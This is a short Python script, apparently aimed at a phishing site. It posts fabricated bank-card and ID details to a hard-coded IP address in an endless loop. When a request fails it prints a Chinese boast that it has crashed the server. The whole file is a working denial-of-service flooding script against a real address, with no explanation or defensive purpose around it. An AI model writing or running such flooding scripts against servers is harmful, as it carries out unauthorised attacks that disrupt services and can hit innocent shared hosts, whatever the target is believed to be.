#!/usr/bin/python
# -*- coding: UTF-8 -*-

import urllib.request
import urllib


def post():
    visited_count = 0
    try:
        while True:
            form = {'idType': '1', 'g_zhanghao': '277678716781987', 'g_wangyin': '651727', 'g_xingmin': '爸爸',
                    'g_shenfenzheng': '7182781728378172', 'g_shouji': '12719628', 'g_cvn': '111', 'g_yxq': '02/29',
                    'iaa': '1'}
            test_data_urlencode = urllib.parse.urlencode(form)
            requrl = "http://118.193.251.169/submit.asp"
            req = urllib.request.Request(url=requrl, data=test_data_urlencode.encode(encoding="utf-8", errors="ignore"),
                                         method='POST')
            data = urllib.request.urlopen(req, timeout=120).read()
            visited_count += 1
            # data = data.decode('UTF-8')
            print(data, '\n已访问', visited_count, '次')
            # print(i)
    except BaseException:
        print('已成功致服务器发生故障,欧耶!!!')


post()
